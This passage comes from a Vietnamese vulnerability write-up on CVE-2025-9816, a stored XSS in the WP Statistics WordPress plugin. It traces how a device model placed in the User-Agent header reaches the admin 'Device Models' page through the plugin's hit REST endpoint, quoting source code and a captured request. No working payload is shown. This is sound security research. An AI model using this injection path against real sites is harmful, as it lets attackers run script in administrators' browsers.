 return false;&#xA;}&#xA;&#xA;public static function unknownToNotSet($value)&#xA;{&#xA;    if (self::isUnknown($value)) {&#xA;        return __(&amp;#39;(not set)&amp;#39;, &amp;#39;wp-statistics&amp;#39;);&#xA;    }&#xA;    return $value;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;unknownToNotSet()&lt;/code&gt; sẽ trả về &lt;code&gt;(not set)&lt;/code&gt; nếu &lt;code&gt;$item-&amp;gt;model&lt;/code&gt; rỗng, &lt;code&gt;Unknown&lt;/code&gt;, &lt;code&gt;Unknown&lt;/code&gt; theo từng ngôn ngữ.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;__(&amp;quot;Unknown&amp;quot;, &#39;wp-statistics&#39;)&lt;/code&gt; sẽ tìm bản dịch của &lt;code&gt;Unknown&lt;/code&gt; trong file dịch &lt;code&gt;.po&lt;/code&gt;/&lt;code&gt;.mo&lt;/code&gt; của text domain &lt;code&gt;wp-statistics&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 Không có cơ chế bảo vệ &lt;code&gt;$item-&amp;gt;model&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$data&lt;/code&gt; không được khởi tạo trong file này nên chắc chắn rắng nó được khởi tạo từ nơi khác và &lt;code&gt;models.php&lt;/code&gt;{: .filepath} sẽ sử dụng nó khi được include.&#xA;Ta có thể search bằng từ khóa &lt;code&gt;models.php&lt;/code&gt; để tìm đến nơi gọi đến nó, nhưng ở đây nó được &lt;strong&gt;include&lt;/strong&gt; động. Thay vào đó, ta search với tên thư mục chứa nó &lt;code&gt;pages/devices&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/search1.png&#34;&#xA;    alt=&#34;Diff — Cách các template được gọi động&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff — Cách các template được gọi động&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 &lt;code&gt;models.php&lt;/code&gt;{: .filepath} sẽ được gọi động trong hàm &lt;code&gt;render()&lt;/code&gt; của class &lt;code&gt;TabsView&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class TabsView extends BaseTabView&#xA;{&#xA;    public function render()&#xA;    {&#xA;        $currentTab  = $this-&amp;gt;getCurrentTab();&#xA;        $data        = $this-&amp;gt;getTabData();&#xA;&#xA;        $args = [&#xA;            &amp;#39;title&amp;#39;           =&amp;gt; esc_html__(&amp;#39;Devices&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;            &amp;#39;pageName&amp;#39;        =&amp;gt; Menus::get_page_slug(&amp;#39;devices&amp;#39;),&#xA;            &amp;#39;paged&amp;#39;           =&amp;gt; Admin_Template::getCurrentPaged(),&#xA;            &amp;#39;custom_get&amp;#39;      =&amp;gt; [&amp;#39;tab&amp;#39; =&amp;gt; $currentTab],&#xA;            &amp;#39;data&amp;#39;            =&amp;gt; $data,&#xA;            &amp;#39;viewMoreUrlArgs&amp;#39; =&amp;gt; [&amp;#39;type&amp;#39; =&amp;gt; &amp;#39;single-&amp;#39; . rtrim($currentTab, &amp;#39;s&amp;#39;), &amp;#39;from&amp;#39; =&amp;gt; Request::get(&amp;#39;from&amp;#39;), &amp;#39;to&amp;#39; =&amp;gt; Request::get(&amp;#39;to&amp;#39;)],&#xA;            &amp;#39;tabs&amp;#39;            =&amp;gt; [&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;overview&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Overview&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;browsers&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Browsers&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;platforms&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Operating Systems&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;models&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Device Models&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;categories&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Device Categories&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ]&#xA;            ],&#xA;        ];&#xA;&#xA;        Admin_Template::get_template([&amp;#39;layout/header&amp;#39;, &amp;#39;layout/tabbed-page-header&amp;#39;, &amp;#34;pages/devices/$currentTab&amp;#34;, &amp;#39;layout/postbox.hide&amp;#39;, &amp;#39;layout/footer&amp;#39;], $args);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Có sự tương quan giữa các giá trị trong &lt;code&gt;$args&lt;/code&gt; và submenu &lt;strong&gt;Devices&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/submenu.png&#34;&#xA;    alt=&#34;Diff — Sự tương quan giữa các giá trị trong $args và submenu Devices&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff — Sự tương quan giữa các giá trị trong $args và submenu Devices&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Giá trị &lt;code&gt;tab&lt;/code&gt; trong &lt;code&gt;args&lt;/code&gt; sẽ tương ứng với param &lt;code&gt;tab&lt;/code&gt; trên URL =&amp;gt; Phạm vi truy vết nằm trong submenu &lt;strong&gt;Devices&lt;/strong&gt; của admin panel. Ta cần xác định &lt;code&gt;$currentTab&lt;/code&gt; để biết cách &lt;code&gt;render()&lt;/code&gt; gọi đến &lt;code&gt;models.php&lt;/code&gt;{: .filepath} và &lt;code&gt;$data&lt;/code&gt; để inject payload.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Biến $currentTab&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// $currentTab  = $this-&amp;gt;getCurrentTab();&#xA;protected function getCurrentTab()&#xA;{&#xA;    return Request::get(&amp;#39;tab&amp;#39;, $this-&amp;gt;defaultTab);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getCurrentTab()&lt;/code&gt; trả về giá trị của &lt;code&gt;Request::get()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// $param=&amp;#39;tab&amp;#39;&#xA;public static function get($param, $default = false, $return = &amp;#39;string&amp;#39;)&#xA;{&#xA;    if (empty($_REQUEST[$param])) return $default;&#xA;&#xA;    $value = $_REQUEST[$param];&#xA;&#xA;    if ($return === &amp;#39;string&amp;#39;) {&#xA;        return sanitize_text_field($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;url&amp;#39;) {&#xA;        return sanitize_url($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;number&amp;#39;) {&#xA;        return intval($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;text&amp;#39;) {&#xA;        return sanitize_textarea_field($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;bool&amp;#39;) {&#xA;        return boolval($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;array&amp;#39; &amp;amp;&amp;amp; is_array($value)) {&#xA;        return array_map(&amp;#39;sanitize_text_field&amp;#39;, $value);&#xA;    }&#xA;&#xA;    return $value;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 &lt;code&gt;get()&lt;/code&gt; trả về giá trị của param &lt;code&gt;&#39;tab&#39;&lt;/code&gt; được lấy từ &lt;code&gt;$_REQUEST[&#39;tab&#39;]&lt;/code&gt;, ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp-admin/admin.php?page=wps_devices_page&amp;amp;tab=models &amp;lt;-- $value=models&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 &lt;code&gt;$currentTab&lt;/code&gt; là giá trị của param &lt;code&gt;tab&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Biến $data&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// $data = $this-&amp;gt;getTabData();&#xA;protected function getTabData()&#xA;{&#xA;    $currentTab     = ucwords($this-&amp;gt;getCurrentTab(), &amp;#39;-&amp;#39;);&#xA;    $tabDataMethod  = &amp;#39;get&amp;#39; . str_replace(&amp;#39;-&amp;#39;, &amp;#39;&amp;#39;, $currentTab) . &amp;#39;Data&amp;#39;; // getModelsData&#xA;&#xA;    if (!method_exists($this, $tabDataMethod)) {&#xA;        // Filter to add data for locked tab&#xA;        return apply_filters(&amp;#34;wp_statistics_{$this-&amp;gt;getCurrentPage()}_{$this-&amp;gt;getCurrentTab()}_data&amp;#34;, []);&#xA;    };&#xA;&#xA;    return $this-&amp;gt;$tabDataMethod();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;getTabData()&lt;/code&gt; được định nghĩa trong abstract class &lt;code&gt;BaseTabView&lt;/code&gt;, được class &lt;code&gt;TabsView&lt;/code&gt; kế thừa nên &lt;code&gt;$data = $this-&amp;gt;getTabData();&lt;/code&gt; là cách &lt;code&gt;TabsView&lt;/code&gt; gọi hàm thừa hưởng từ &lt;code&gt;BaseTabView&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta đang focus vào &lt;strong&gt;model&lt;/strong&gt; nên tab ở đây là &lt;code&gt;models&lt;/code&gt;, &lt;code&gt;$tabDataMethod&lt;/code&gt; sẽ có giá trị &lt;code&gt;&#39;getModelsData&#39;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nếu &lt;code&gt;getModelsData()&lt;/code&gt; không tồn tại thì filter hook &lt;code&gt;wp_statistics_wps_devices_page_models_data&lt;/code&gt; được áp dụng. Nhưng ở đây &lt;code&gt;getModelsData()&lt;/code&gt; được định nghĩa trong class &lt;code&gt;TabsView&lt;/code&gt;, &lt;code&gt;$this&lt;/code&gt; cũng chính là &lt;code&gt;TabsView&lt;/code&gt; nên &lt;code&gt;getModelsData()&lt;/code&gt; của &lt;code&gt;TabsView&lt;/code&gt; được gọi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct()&#xA;{&#xA;    parent::__construct();&#xA;&#xA;    $this-&amp;gt;dataProvider = new DevicesDataProvider([&#xA;        &amp;#39;per_page&amp;#39; =&amp;gt; 10,&#xA;        &amp;#39;page&amp;#39;     =&amp;gt; Admin_Template::getCurrentPaged()&#xA;    ]);&#xA;}&#xA;&#xA;public function getModelsData()&#xA;{&#xA;    return $this-&amp;gt;dataProvider-&amp;gt;getModelsData();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getModelsData()&lt;/code&gt; trả về kết quả của &lt;code&gt;getModelsData()&lt;/code&gt; trong class &lt;code&gt;DevicesDataProvider&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct($args)&#xA;{&#xA;    $this-&amp;gt;args = $args;&#xA;&#xA;    $this-&amp;gt;visitorsModel = new VisitorsModel();&#xA;}&#xA;&#xA;public function getModelsData()&#xA;{&#xA;    $args = array_merge($this-&amp;gt;args, [&#xA;        &amp;#39;field&amp;#39;    =&amp;gt; &amp;#39;model&amp;#39;,&#xA;        &amp;#39;group_by&amp;#39; =&amp;gt; [&amp;#39;model&amp;#39;]&#xA;    ]);&#xA;&#xA;    $visitors = $this-&amp;gt;visitorsModel-&amp;gt;getVisitorsDevices($args);&#xA;&#xA;    if (! empty($visitors)) {&#xA;        $visitors = array_reduce($visitors, function ($carry, $item) {&#xA;            // Trim whitespace and default empty models to &amp;#39;Unknown&amp;#39;&#xA;            $model = trim($item-&amp;gt;model ?? &amp;#39;&amp;#39;);&#xA;&#xA;            if ($model === &amp;#39;&amp;#39;) {&#xA;                $model = &amp;#39;Unknown&amp;#39;;&#xA;            }&#xA;&#xA;            if (isset($carry[$model])) {&#xA;                $carry[$model]-&amp;gt;visitors &amp;#43;= $item-&amp;gt;visitors;&#xA;            } else {&#xA;                $carry[$model] = (object)[&#xA;                    &amp;#39;model&amp;#39;    =&amp;gt; $model,&#xA;                    &amp;#39;visitors&amp;#39; =&amp;gt; $item-&amp;gt;visitors&#xA;                ];&#xA;            }&#xA;            return $carry;&#xA;        }, []);&#xA;    }&#xA;&#xA;    return [&#xA;        &amp;#39;visitors&amp;#39; =&amp;gt; $visitors,&#xA;        &amp;#39;total&amp;#39;    =&amp;gt; $this-&amp;gt;visitorsModel-&amp;gt;countColumnDistinct($args),&#xA;        &amp;#39;visits&amp;#39;   =&amp;gt; $this-&amp;gt;visitorsModel-&amp;gt;countColumnDistinct(array_merge($args, [&amp;#39;field&amp;#39; =&amp;gt; &amp;#39;ID&amp;#39;])),&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta focus vào &lt;code&gt;$visitors&lt;/code&gt; vì nó được lặp và hiển thị ra HTML trong &lt;code&gt;models.php&lt;/code&gt;{: .filepath}&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php foreach ($data[&amp;#39;visitors&amp;#39;] as $item) : ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$visitors&lt;/code&gt; là kết quả trả về của hàm &lt;code&gt;getVisitorsDevices()&lt;/code&gt; thuộc class &lt;code&gt;VisitorsModel&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getVisitorsDevices($args = [])&#xA;{&#xA;    $args = $this-&amp;gt;parseArgs($args, [&#xA;        &amp;#39;field&amp;#39;          =&amp;gt; &amp;#39;agent&amp;#39;,&#xA;        &amp;#39;date&amp;#39;           =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;where_not_null&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;group_by&amp;#39;       =&amp;gt; [],&#xA;        &amp;#39;order_by&amp;#39;       =&amp;gt; &amp;#39;visitors&amp;#39;,&#xA;        &amp;#39;order&amp;#39;          =&amp;gt; &amp;#39;DESC&amp;#39;,&#xA;        &amp;#39;per_page&amp;#39;       =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;page&amp;#39;           =&amp;gt; 1,&#xA;    ]);&#xA;&#xA;    $result = Query::select([&#xA;        $args[&amp;#39;field&amp;#39;],&#xA;        &amp;#39;COUNT(visitor.ID) AS `visitors`&amp;#39;,&#xA;    ])&#xA;        -&amp;gt;from(&amp;#39;visitor&amp;#39;)&#xA;        -&amp;gt;whereDate(&amp;#39;last_counter&amp;#39;, $args[&amp;#39;date&amp;#39;])&#xA;        -&amp;gt;whereNotNull($args[&amp;#39;where_not_null&amp;#39;])&#xA;        -&amp;gt;groupBy($args[&amp;#39;group_by&amp;#39;])&#xA;        -&amp;gt;orderBy($args[&amp;#39;order_by&amp;#39;], $args[&amp;#39;order&amp;#39;])&#xA;        -&amp;gt;perPage($args[&amp;#39;page&amp;#39;], $args[&amp;#39;per_page&amp;#39;])&#xA;        -&amp;gt;getAll();&#xA;&#xA;    return $result ? $result : [];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getVisitorsDevices()&lt;/code&gt; truy vấn &lt;code&gt;from(&#39;visitor&#39;)&lt;/code&gt; cụ thể là bảng &lt;code&gt;wp_statistics_visitor&lt;/code&gt; trong database rồi trả về kết quả.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; show tables;&#xA;&amp;#43;-------------------------------------&amp;#43;&#xA;| Tables_in_wordpress                 |&#xA;&amp;#43;-------------------------------------&amp;#43;          &#xA;| wp_statistics_visitor               |&#xA;| wp_other_table                      |&#xA;| wp_users                            |&#xA;&amp;#43;-------------------------------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bảng &lt;code&gt;wp_statistics_visitor&lt;/code&gt; bao gồm các trường sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; desc wp_statistics_visitor;&#xA;&amp;#43;----------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| Field          | Type            | Null | Key | Default | Extra          |&#xA;&amp;#43;----------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| ID             | bigint          | NO   | PRI | NULL    | auto_increment |&#xA;| last_counter   | date            | NO   | MUL | NULL    |                |&#xA;| referred       | text            | NO   |     | NULL    |                |&#xA;| agent          | varchar(180)    | NO   | MUL | NULL    |                |&#xA;| platform       | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| version        | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| device         | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| model          | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| UAString       | varchar(190)    | YES  |     | NULL    |                |&#xA;| ip             | varchar(60)     | NO   | MUL | NULL    |                |&#xA;| location       | varchar(10)     | YES  | MUL | NULL    |                |&#xA;| user_id        | bigint          | NO   |     | NULL    |                |&#xA;| hits           | int             | YES  |     | NULL    |                |&#xA;| honeypot       | int             | YES  |     | NULL    |                |&#xA;| city           | varchar(100)    | YES  |     | NULL    |                |&#xA;| region         | varchar(100)    | YES  |     | NULL    |                |&#xA;| continent      | varchar(50)     | YES  |     | NULL    |                |&#xA;| source_channel | varchar(50)     | YES  |     | NULL    |                |&#xA;| source_name    | varchar(100)    | YES  |     | NULL    |                |&#xA;| first_page     | bigint unsigned | YES  |     | NULL    |                |&#xA;| first_view     | datetime        | YES  |     | NULL    |                |&#xA;| last_page      | bigint unsigned | YES  |     | NULL    |                |&#xA;| last_view      | datetime        | YES  |     | NULL    |                |&#xA;&amp;#43;----------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Như vậy, &lt;code&gt;$data&lt;/code&gt; là chứa kết quả trả về của truy vấn đến bảng &lt;code&gt;wp_statistics_visitor&lt;/code&gt;(chứa &lt;strong&gt;model&lt;/strong&gt; của &lt;strong&gt;visitor&lt;/strong&gt;) và một số giá trị khác.&#xA;Ta cần tìm cách để lưu &lt;strong&gt;XSS payload&lt;/strong&gt; vào trường &lt;strong&gt;model&lt;/strong&gt; của &lt;code&gt;wp_statistics_visitor&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;May mắn thay, trong lúc chật vật với vị trí sink không chính xác lúc ban đầu, tôi đã tìm ra cách plugin lưu trữ thông tin của &lt;strong&gt;visitor&lt;/strong&gt; vào &lt;code&gt;wp_statistics_visitor&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&amp;#39;wp-statistics/v2&amp;#39;, &amp;#39;/&amp;#39; . &amp;#39;hit&amp;#39;, array(&#xA;    array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; \WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; array($this, &amp;#39;hit_callback&amp;#39;),&#xA;        &amp;#39;args&amp;#39;                =&amp;gt; self::require_params_hit(),&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; function (\WP_REST_Request $request) {&#xA;            return $this-&amp;gt;checkSignature($request);&#xA;        }&#xA;    )&#xA;));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin đã đăng ký một &lt;strong&gt;REST API&lt;/strong&gt; với endpoint &lt;code&gt;/wp-json/wp-statistics/v2/hit&lt;/code&gt;, nhận &lt;code&gt;hit_callback()&lt;/code&gt; làm callback.&#xA;Nhưng để sử dụng được endpoint này, cần phải vượt qua &lt;code&gt;checkSignature&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function checkSignature($request)&#xA;{&#xA;    if (Helper::isRequestSignatureEnabled()) {&#xA;        $signature = $request-&amp;gt;get_param(&amp;#39;signature&amp;#39;);&#xA;        $payload   = [&#xA;            $request-&amp;gt;get_param(&amp;#39;source_type&amp;#39;),&#xA;            (int)$request-&amp;gt;get_param(&amp;#39;source_id&amp;#39;),&#xA;        ];&#xA;&#xA;        if (!Signature::check($payload, $signature)) {&#xA;            return new \WP_Error(&amp;#39;rest_forbidden&amp;#39;, __(&amp;#39;Invalid signature&amp;#39;, &amp;#39;wp-statistics&amp;#39;), array(&amp;#39;status&amp;#39; =&amp;gt; 403));&#xA;        }&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Các param này sẽ tự động cung cấp khi ta truy cập trang web =&amp;gt; luôn true.&#xA;Khi bắt request bằng &lt;strong&gt;BurpSuite&lt;/strong&gt; ta sẽ thấy rõ điều đó&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp-statistics/v2/hit HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; model_here) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36&#xA;&#xA;wp_statistics_hit=1&amp;amp;source_type=home&amp;amp;source_id=0&amp;amp;search_query=&amp;amp;signature=787b07b8979cb982ec89a4f103a68081&amp;amp;endpoint=hit&amp;amp;referred=&amp;amp;page_uri=Lw%3D%3D&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Như vậy, ta không ần quan tâm đến &lt;code&gt;permission_callback&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Quay trở lại với &lt;code&gt;hit_callback()&lt;/code&gt;, hàm chính xử lý việc lưu trữ thông tin &lt;strong&gt;visitor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function hit_callback()&#xA;{&#xA;    $statusCode = false;&#xA;&#xA;    try {&#xA;        Helper::validateHitRequest();&#xA;        Hits::record();&#xA;&#xA;        $responseData[&amp;#39;status&amp;#39;] = true;&#xA;&#xA;    } catch (Exception $e) {&#xA;        $responseData[&amp;#39;status&amp;#39;] = false;&#xA;        $responseData[&amp;#39;data&amp;#39;]   = $e-&amp;gt;getMessage();&#xA;        $statusCode             = $e-&amp;gt;getCode();&#xA;    }&#xA;&#xA;    $response = rest_ensure_response($responseData);&#xA;&#xA;    if ($statusCode) {&#xA;        $response-&amp;gt;set_status($statusCode);&#xA;    }&#xA;&#xA;    $response-&amp;gt;set_headers(array(&#xA;        &amp;#39;Cache-Control&amp;#39; =&amp;gt; &amp;#39;no-cache&amp;#39;,&#xA;    ));&#xA;&#xA;    return $response;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Lỗi liên quan đến user-agent header và model đặt trong nó, ta cần focus, tìm cách để thêm model vào database. &lt;a href=&#34;https://51degrees.com/blog/understanding-user-agent-string#Unpacking%20the%20User%20Agent%20string&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Đây&lt;/a&gt; là cú pháp của user-agent có model.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Helper::validateHitRequest();&#xA;public static function validateHitRequest()&#xA;{&#xA;    $isValid = Request::validate([&#xA;        &amp;#39;page_uri&amp;#39;     =&amp;gt; [&#xA;            &amp;#39;required&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;type&amp;#39;            =&amp;gt; &amp;#39;string&amp;#39;,&#xA;            &amp;#39;encoding&amp;#39;        =&amp;gt; &amp;#39;base64&amp;#39;,&#xA;            &amp;#39;invalid_pattern&amp;#39; =&amp;gt; self::injectionPatterns()&#xA;        ],&#xA;        &amp;#39;search_query&amp;#39; =&amp;gt; [&#xA;            &amp;#39;required&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;type&amp;#39;            =&amp;gt; &amp;#39;string&amp;#39;,&#xA;            &amp;#39;encoding&amp;#39;        =&amp;gt; &amp;#39;base64&amp;#39;,&#xA;            &amp;#39;invalid_pattern&amp;#39; =&amp;gt; self::injectionPatterns()&#xA;        ],&#xA;        &amp;#39;source_id&amp;#39;    =&amp;gt; [&#xA;            &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;number&amp;#39;,&#xA;            &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39; =&amp;gt; false&#xA;        ],&#xA;        &amp;#39;referred&amp;#39;     =&amp;gt; [&#xA;            &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;url&amp;#39;,&#xA;            &amp;#39;encoding&amp;#39; =&amp;gt; &amp;#39;base64&amp;#39;&#xA;        ],&#xA;    ]);&#xA;&#xA;    if (!$isValid) {&#xA;        do_action(&amp;#39;wp_statistics_invalid_hit_request&amp;#39;, $isValid, IP::getIP());&#xA;        throw new ErrorException(esc_html__(&amp;#39;Invalid hit/online request.&amp;#39;, &amp;#39;wp-statistics&amp;#39;));&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;validateHitRequest()&lt;/code&gt; là hàm dùng để validate các params được truyền vào body của request đến &lt;code&gt;hit&lt;/code&gt; ở trên, các param này được plugin cung cấp nên chỉ cần tái sử dụng lại nó =&amp;gt; không ảnh hưởng gì đến model trong user-agent header.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Hits::record();&#xA;public static function record($visitorProfile = null)&#xA;{&#xA;    if (!$visitorProfile) {&#xA;        $visitorProfile = new VisitorProfile();&#xA;    }&#xA;&#xA;    /**&#xA;        * Record Pages&#xA;        */&#xA;    $pageId = false;&#xA;    if (Pages::active()) {&#xA;        $pageId = Pages::record($visitorProfile);&#xA;    }&#xA;&#xA;    /**&#xA;        * Record Visitor Detail&#xA;        */&#xA;    $visitorId = false;&#xA;    if (Visitor::active()) {&#xA;        $visitorId = Visitor::record($visitorProfile, [&amp;#39;page_id&amp;#39; =&amp;gt; $pageId]);&#xA;    }&#xA;&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Từ khóa &lt;code&gt;record&lt;/code&gt; làm tôi liên tưởng đến việc quay video màn hình và lưu trữ nó vào bộ nhớ. Tương tự, trong trường hợp này sẽ lưu trữ thông tin visitor vào database.&lt;/p&gt;&#xA;&lt;p&gt;Nếu &lt;code&gt;visitor=null&lt;/code&gt; tức chưa tồn tại thì gọi đến &lt;code&gt;Visitor::active()&lt;/code&gt; để kiểm tra và thực hiện &lt;code&gt;record()&lt;/code&gt; của &lt;strong&gt;Visitor&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function active()&#xA;{&#xA;    return (has_filter(&amp;#39;wp_statistics_active_visitors&amp;#39;)) ? apply_filters(&amp;#39;wp_statistics_active_visitors&amp;#39;, true) : true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;active()&lt;/code&gt; sẽ trả về &lt;strong&gt;true mặc định&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu trong plugin đã &lt;code&gt;add_filter(&#39;wp_statistics_active_visitors&#39;, &#39;my_function&#39;)&lt;/code&gt;, thì giá trị trả về sẽ được thay đổi theo kết quả của filter.&lt;/li&gt;&#xA;&lt;li&gt;Nếu không có filter nào, thì nó chỉ trả về &lt;strong&gt;true&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Search với hook name &lt;code&gt;wp_statistics_active_visitors&lt;/code&gt; ta không thấy filter nào được add cả&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/search2.png&#34;&#xA;    alt=&#34;Kết quả tìm kiếm hook name wp_statistics_active_visitors&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả tìm kiếm hook name wp_statistics_active_visitors&lt;/p&gt;&#xA;    